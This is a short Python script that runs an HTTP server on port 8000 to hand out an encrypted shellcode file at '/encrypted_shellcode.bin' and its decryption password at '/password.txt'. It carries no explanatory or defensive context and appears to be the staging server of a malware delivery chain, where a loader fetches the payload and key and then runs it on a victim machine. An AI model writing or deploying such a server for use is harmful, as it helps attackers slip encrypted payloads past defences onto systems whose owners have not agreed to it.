from http.server import BaseHTTPRequestHandler, HTTPServer

# Define the password required for authentication
PASSWORD = "YourPassword"

# Define the paths to the encrypted shellcode file and the password file
ENCRYPTED_SHELLCODE_PATH = "/encrypted_shellcode.bin"
PASSWORD_FILE_PATH = "/password.txt"

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == ENCRYPTED_SHELLCODE_PATH:
            # Serve the encrypted shellcode file
            with open("encrypted_shellcode.bin", "rb") as f:
                self.send_response(200)
                self.send_header("Content-type", "application/octet-stream")
                self.end_headers()
                self.wfile.write(f.read())
        elif self.path == PASSWORD_FILE_PATH:
            # Serve the password file
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(PASSWORD.encode())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=8000):
    server_address = ("", port)
    httpd = server_class(server_address, handler_class)
    print(f"Starting server on port {port}...")
    httpd.serve_forever()

if __name__ == "__main__":
    run()

